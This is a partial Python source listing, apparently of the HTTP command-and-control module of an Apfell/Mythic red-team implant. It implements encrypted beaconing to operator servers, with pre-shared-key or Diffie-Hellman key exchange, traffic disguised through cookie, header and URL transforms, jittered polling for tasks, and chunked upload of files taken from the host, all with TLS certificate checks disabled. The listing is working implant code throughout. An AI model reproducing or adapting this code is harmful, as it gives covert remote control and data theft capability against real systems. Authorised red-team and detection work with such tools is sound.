...
class C2():
    ...
    import ssl
    def __init__(self):
        self.c2_config = raw_c2_config
        self.url_bases = self.c2_config['apfellBases']
        self.tasking_endpoint = self.c2_config['GET']['getNextTask']
        self.response_endpoint = self.c2_config['POST']['postResponse']
        self.file_endpoint = self.c2_config['POST']['pullFile']
        self.interval = self.c2_config['interval']
        self.jitter = self.c2_config['jitter']
        self.timeout = 20  # used for doing timeouts for web connections
        self.aes_encryption_key = "AESPSK"
        self.id = ""
        self.chunk_size = self.c2_config['chunk_size']
        # adjust the checkin URI based on what we're tyring to do
        if 'postNewCallbackDHEKE' in self.c2_config['POST']:
            self.checkin_endpoint = self.c2_config['POST']['postNewCallbackDHEKE']
            self.encryption = True
            self.EKE = True
            self.clientPub = DiffieHellman()
        elif 'postNewCallbackPSK' in self.c2_config['POST']:
            self.checkin_endpoint = self.c2_config['POST']['postNewCallbackPSK']
            self.encryption = True
            self.EKE = False
        elif 'postNewCallbackEKE' in self.c2_config['POST']:
            self.checkin_endpoint = self.c2_config['POST']['postNewCallbackEKE']
            self.encryption = True
            self.EKE = True
        else:
            self.checkin_endpoint = self.c2_config['POST']['postNewCallback']
            self.encryption = False
            self.EKE = False
        self.headers = self.c2_config['Headers']
        self.cookies = self.c2_config['Cookies']

    def url_base(self):
        return random.choice(self.url_bases)

    def prepend(self, *args):
        return args[1] + args[0]

    def r_prepend(self, *args):
    ...
    def r_random_number(self, *args):
        # called with random_mixed(value, 10), always appends
        # return the string going from 0 to -10 (or ten from the end)
        return args[0][: -1 * args[1]]

    def random_alpha(self, *args):
        # called with random_alpha(value, 10), always appends
        letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        rnd = ''.join(random.choice(letters) for i in range(args[1]))
        return args[0] + rnd

    def r_random_alpha(self, *args):
        # called with random_mixed(value, 10), always appends
        # return the string going from 0 to -10 (or ten from the end)
        return args[0][: -1 * args[1]]

    def choose_random(self, *args):
        return args[0] + random.choice(args[1])

    def get_value(self, value, transforms):
        ...
        if len(transforms) > 0:
            for step in transforms[::-1]:
                if step['function'] == "base64":
                    value = self.r_b64(value)
                elif step['function'] == 'prepend':
                    value = self.r_prepend(value, *step['parameters'])
                elif step['function'] == "append":
                    value = self.r_append(value, *step['parameters'])
                elif step['function'] == "random_mixed":
                    value = self.r_random_mixed(value, *step['parameters'])
                elif step['function'] == "random_number":
                    value = self.r_random_number(value, *step['parameters'])
                elif step['function'] == "random_alpha":
                    value = self.r_random_alpha(value, *step['parameters'])
        return value

    def create_value(self, value, transforms):
        for step in transforms:
            if step['function'] == 'base64':
                value = self.b64(value)
            elif step['function'] == 'prepend':
                value = self.prepend(value, *step['parameters'])
            elif step['function'] == 'append':
                value = self.append(value, *step['parameters'])
            elif step['function'] == "random_mixed":
                value = self.random_mixed(value, *step['parameters'])
            elif step['function'] == "random_number":
                value = self.random_number(value, *step['parameters'])
            elif step['function'] == "random_alpha":
                value = self.random_alpha(value, *step['parameters'])
            elif step['function'] == "choose_random":
                value = self.choose_random(value, *step['parameters'])
        return value

    def create_message(self, endpoint, agent_id, data, method="POST"):
        base_uri = endpoint['url']
        if "<agent:uuid>" in endpoint['url']:
            base_uri = base_uri.replace("<agent:uuid>", agent_id)
        for url_param in endpoint['urlFunctions']:
            try:
                value = endpoint['urlFunctions'][url_param]['value']
            except:
                value = ""
            value = self.create_value(value, endpoint['urlFunctions'][url_param]['transforms'])
            base_uri = base_uri.replace(endpoint['urlFunctions'][url_param]['name'], value)
        query_params = {}
        for param in endpoint['QueryParameters'].keys():
            if param == "agent":
                value = agent_id
            else:
                try:
                    value = endpoint['QueryParameters'][param]['value']
                except:
                    value = ""
            value = self.create_value(value, endpoint['QueryParameters'][param]['transforms'])
            query_params[endpoint['QueryParameters'][param]['name']] = value
        if len(query_params.keys()) > 0:
            base_url = self.url_base() + base_uri + "?" + self.urllib.urlencode(query_params)
        else:
            base_url = self.url_base() + base_uri
        # now make all the cookies we need and set the headers
        cookies = self.cookies
        for c in endpoint['Cookies'].keys():
            if c == "agent":
                value = agent_id
            else:
                value = endpoint['Cookies'][c]['value']
            value = self.create_value(value, endpoint['Cookies'][c]['transforms'])
            cookies[endpoint['Cookies'][c]['name']] = value
        headers = self.headers
        headers.update(self.c2_config[method]['Headers'])
        if len(cookies.keys()) > 0:
            headers['Cookie'] = ";".join('%s=%s' % (k, v) for k, v in cookies.items())
        # now deal with the body
        data = self.create_value(data, endpoint['Body'])
        req = self.urllib2.Request(base_url, data, headers=headers)
        return req

    def retrieve_message(self, response, endpoint, method):
        # the goal here is to get the data back out
        # the data will either be in the body or cookie of the response
        try:
            if 'data' in self.c2_config[method]['ServerCookies']:
                cookie_name = self.c2_config[method]['ServerCookies']['data']['name']
                cookie_val = response.cookies[cookie_name]
                data = self.get_value(cookie_val, self.c2_config[method]['ServerCookies']['data']['transforms'])
            else:
                data = self.get_value(response, self.c2_config[method]['ServerBody'])
        except Exception as e:
            return None
        return data

    def wait(self):
        jitter_percentage = (self.interval * self.jitter) / 100
        low = self.interval - jitter_percentage
        high = self.interval + jitter_percentage
        if low == high:
            self.time.sleep(low)
            return
        try:
            self.time.sleep(self.randrange(self.interval - jitter_percentage, self.interval + jitter_percentage))
        except Exception as e:
            return
    ...
    def get_wait_time(self):
        ...
        if low == high:
            return low
        return self.randrange(self.interval - jitter_percentage, self.interval + jitter_percentage)

    def decrypt_apfell_message(self, data):
        raw_response = self.base64.b64decode(data)
        plaintext = aes_decrypt(self.base64.b64decode(self.aes_encryption_key), raw_response)
        return plaintext

    def encrypt_apfell_message(self, data):
    ...
    def checkin(self, user="", host="", ip="", pid="", os="", arch=""):
        ...
        if self.EKE:
            ...
            initial_message = self.json.dumps({"SESSIONID": session_id, "PUB": self.clientPub.publicKey})
            cipher_initial_message = self.encrypt_apfell_message(initial_message)
            req = self.create_message(self.checkin_endpoint, apfell.UUID, cipher_initial_message)
            response = None
            while response is None:
                try:
                    ...
                    continue
                try:
                    # we need to decrypt the data first
                    the_page = self.retrieve_message(the_page, self.checkin_endpoint, 'POST')
                    plaintext = self.decrypt_apfell_message(the_page)
                    checkin_info_json = self.json.loads(plaintext)
                    # calculate the shared secret
                    self.clientPub.genKey(checkin_info_json['SERVERPUB'])
                    self.aes_encryption_key = self.base64.b64encode(self.clientPub.getKey()).decode('utf-8')
                    # now that we have a shared session key, we can continue like normal
                    message = self.encrypt_apfell_message(userdata)
                    req = self.create_message(self.checkin_endpoint, session_id, message)
                    response = None
                    while response is None:
                        try:
                            response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                            ...
                            continue
                        try:
                            # we need to decrypt the data first before trying to load it as JSON
                            the_page = self.retrieve_message(the_page, self.checkin_endpoint, 'POST')
                            plaintext = self.decrypt_apfell_message(the_page)
            ...
            message = self.encrypt_apfell_message(userdata)
            req = self.create_message(self.checkin_endpoint, apfell.UUID, message)
            response = None
            while response is None:
                try:
                    response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
            ...
            req = self.create_message(self.checkin_endpoint, apfell.UUID, userdata)
            response = None
            while response is None:
                try:
                    response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
    ...
    def get_task(self):
        req = self.create_message(self.tasking_endpoint, self.id, None, "GET")
        response = None
        while response is None:
            try:
                response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                ...
                continue
            try:
                the_page = self.retrieve_message(the_page, self.tasking_endpoint, 'GET')
                if self.encryption:
                    plaintext = self.decrypt_apfell_message(the_page)
                    return self.json.loads(plaintext)
                else:
                    return self.json.loads(the_page)
            except Exception as e:
                #print(e)
                raise e

    def post_response(self, response, task_id=""):
        userdata = self.json.dumps({"response": self.base64.b64encode(response.encode('utf-8')).decode('utf-8')})
        if self.encryption:
            message = self.encrypt_apfell_message(userdata)
        else:
            message = userdata
        req = self.create_message(self.response_endpoint, task_id, message)
        response = None
        while response is None:
            try:
                response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                ...
                continue
            try:
                the_page = self.retrieve_message(the_page, self.response_endpoint, 'POST')
                if self.encryption:
                    plaintext = self.decrypt_apfell_message(the_page)
                    data = self.json.loads(plaintext)
                else:
    ...
    def download(self, task_id="", data=""):
        ...
        for x in range(chunks):
            ...
            resp = self.post_response(response=self.json.dumps({"chunk_num": x+1, "file_id": file_id, "chunk_data": self.base64.b64encode(chunk).decode('utf-8')}), task_id=task_id)
            #print(resp)
    ...
    def upload(self, file_id):
        ...
        if self.encryption:
            data = self.encrypt_apfell_message(data)
        req = self.create_message(self.file_endpoint, self.id, data)
        response = None
        while response is None:
            try:
                response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                ...
                continue
            try:
                the_page = self.retrieve_message(the_page, self.file_endpoint, 'POST')
                if self.encryption:
                    data = self.base64.b64decode(self.decrypt_apfell_message(the_page))
                else:
                    data = self.base64.b64decode(the_page)
            except Exception as e:
                #print(e)
                raise e
            return data

##### Encryption leveraged from external sources
"""
Implements AES in python without needing pip install
...
""" 
Implements Diffie-Hellman as standalone library without needing pip install
...
class DiffieHellman(object):
    ...
    def genKey(self, otherKey):
        ...
        s = hashlib.sha256()
        s.update(bytes(str(self.sharedSecret)))
        self.key = s.digest()
